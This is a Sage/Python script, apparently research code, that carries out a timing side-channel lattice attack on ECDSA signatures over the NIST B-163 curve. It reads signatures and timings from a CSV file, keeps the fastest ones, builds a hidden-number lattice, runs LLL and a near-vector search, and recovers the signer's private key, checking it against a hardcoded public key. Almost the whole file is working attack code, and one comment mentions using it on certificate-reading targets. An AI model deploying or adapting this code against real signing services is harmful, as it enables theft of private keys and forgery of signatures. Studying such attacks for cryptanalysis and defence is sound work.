import csv
import itertools
import random
attach "/home/bartcopp/projecten/sidechannels/sage-extra-bindings/NearVector.spyx"         

# Implementation based on my Haskell implementation of this attack:
# https://github.com/bcoppens/CryptoAttacksHaskell

# Usage:
# $ /mnt/data/software/sage/sage-5.12/sage
# attach "/home/bartcopp/projecten/sidechannels/ecdsa/ECDSA-HGS.sage"
# find_private()

data = csv.reader(open('timings.csv', 'r'))

class Input:
  def __init__(self, F, m, r, s, time):
    self.F    = F
    self.m    = m
    self.r    = r
    self.s    = s
    self.time = time
    
    # Filled out later
    self.c = None
    self.d = None
  def __repr__(self):
    return "(m=%s, r=%s, k=%s, t=%s)" % (str(self.m), str(self.r), str(self.s), str(self.time))

def get_coeffs(inputs, order):
  ZZ_q = GF(order)
  
  for i in range(0, len(inputs)):
    input = inputs[i]
    input.c = -input.r / input.s
    input.d = -input.m / input.s
  
  v = []
  w = []
  last = inputs[-1]

  # TODO: factor the computations of c and d out and into the next for, see my scrap paper
  for i in range(0, len(inputs) - 1):
    input = inputs[i]
    A_i = - input.c / last.c
    B_i = - input.c * last.d / last.c + input.d
  
    # lambda_i = 0 => v = A
    v.append(A_i)
    
    # z'_i = 0 (because lambda_i = 0), and z''_i = 0 (because that is what we deduce from the timings), hence w_i = B_i. Also, mu does not even
    # feature in the equations because of this!
    w.append(B_i)
  
  return v, w

def get_lattice_and_close_vector(inputs, order):
  size = len(inputs)
  L = ntl.mat_ZZ(size, size, [0] * (size ^ 2))
  t = ntl.mat_ZZ(1, size, [0] * size)
  
  # First element
  L[(0,0)] = -1
  # Diagonal
  for i in range(1, size):
    L[(i,i)] = order


  v, w = get_coeffs(inputs, order)
  
  for i in range(1, size):
    L[(0, i)] = int(v[i-1])
    t[(0, i)] = int(w[i-1])
  
  return L, t

def get_private(z_h, last):
  k_h     = z_h
  return (last.s * k_h - last.m ) / last.r


def get_result(F, inputs, order):
  size = len(inputs)
  L, t = get_lattice_and_close_vector(inputs, order)
  
  r = ntl.mat_ZZ (1, size, [0]*size)
  
  print "LLL reducing..."
  L.LLL() # Before finding a near vector, LLL-reduce
  print "Finding near vector..."
  NearVector(r, L, t)
  
  private = get_private(F(r[(0,0)]), inputs[size - 1])
  
  return r, private

def get_polynomial_from_bitstring(F, bitstring):
  t = F.0
  current_power = F(1)
  result = F(0)
  while bitstring != 0:
    this_element = bitstring & 1
    bitstring    = bitstring >> 1

    result = result + this_element * current_power
    current_power = current_power * t
  return result

def B163():
  # Constants from FIPS PUB 186-4, Section D.1.3.1.2 Curve B-163 (Using the Polynomial basis)
  F2_x.<t> = GF(2)[]
  order  = 2^163

  b = get_polynomial_from_bitstring(F2_x, 0x20a601907b8c953ca1481eb10512f78744a3205fd)

  K = GF(order=order, name='t', modulus=t^163 + t^7 + t^6 + t^3 + 1)
  
  G_order = 5846006549323611672814742442876390689256843201587
  G_x     = get_polynomial_from_bitstring(F2_x, 0x3f0eba16286a2d57ea0991168d4994637e8343e36)
  G_y     = get_polynomial_from_bitstring(F2_x, 0x0d51fbc6c71a0094fa2cdd545b11c5c0c797324f1)

  curve     = EllipticCurve(K, [1,1,0,0,b])
  generator = curve(G_x, G_y)
  
  return curve, generator, G_order

def get_publickey(curve, x, y):
  return curve(get_polynomial_from_bitstring(curve.base_field(), x), get_polynomial_from_bitstring(curve.base_field(), y))
  

def is_private_key_correct(generator, public, tentative_private):
  reconstructed_public = generator * int(tentative_private)
  return public == reconstructed_public

def from_colon_hex(h):
  return int(h.replace(":", ""),base=16)

def publickey_from_octetstring(curve, string):
  """ See RFC 5480 & friends. First byte == 0x04 -> uncompressed; otherwise compressed or 0, and I don't care about those atm :-) """
  assert string[0:3] == "04:"
  
  string = string[3:]

  # because of the additional : separating both coordinates
  l = (len(string) - 1)
  assert(l % 2) == 0
  pointlen = l / 2
  
  xstr = string[0:pointlen]
  ystr = string[pointlen+1:]
  
  return get_publickey(curve, from_colon_hex(xstr), from_colon_hex(ystr))

# Fixed group order for now
curve, generator, fixed_order = B163()
F = GF(fixed_order)

# There's 3 ways to enter the public key: as octet string (if you'd want to use this for attacking something that reads a certificate), as binary string, and as integers:
#publickey = publickey_from_octetstring(curve, "04:01:cd:58:31:7a:37:40:6b:c8:0d:ef:e4:78:60:03:41:0f:7d:bd:cb:71:07:0c:10:8e:ea:cd:c2:7f:d6:fc:a9:eb:8d:98:83:ac:f9:24:7d:2b:c1")
#publickey = get_publickey(curve, 0b101010100011100001010100010001011010111110110100011001010101100100000001010100001100110101110000110010001101010101111100100000001011010100001101100001100001110000, 0b1011111111011011001111001111010000000001110000101000100110000000011110000110011001000111010010111100011010110000101110110000110010011001101010100001111010000101000)
publickey = get_publickey(curve, 9539482754708420824381805283406692714806201637555,8320640249452422274484421933510243419455281123645)

@parallel
def try_it(subset):
  r, private = get_result(F, subset, fixed_order)
  print "Computed the private key as: %s" % str(private)
  correct = is_private_key_correct(generator, publickey, private)
  if correct:
    print "FOUND IT! private key is %s!" % str(private)

def find_private():
  # We have the option to also get the nonce k and ceiling(lg(k)) as extra fields
  inputs = []
  for (m, sig_r,sig_s,time) in data: # ,log_k)
  #for (time,sig_r,sig_s) in data: # ,log_k)
    #m = int(m) >> (512 - 163) # TODO make configurable, hack to truncate the right amount of bits (this code is for when I tried to attack against a Java implementation)
    inputs.append(Input(F, F(int(m)), F(int(sig_r)), F(int(sig_s)), int(time)))

  # Sort by time
  inputs = sorted(inputs, key=lambda k: k.time)
  #print inputs
  print "Computing..."

  while True:
    subsets = []
    for i in range(0, 50):
      subset = random.sample(inputs[0:50], 40)
      subsets.append(subset)
    for i in try_it(subsets):
      i
  

  
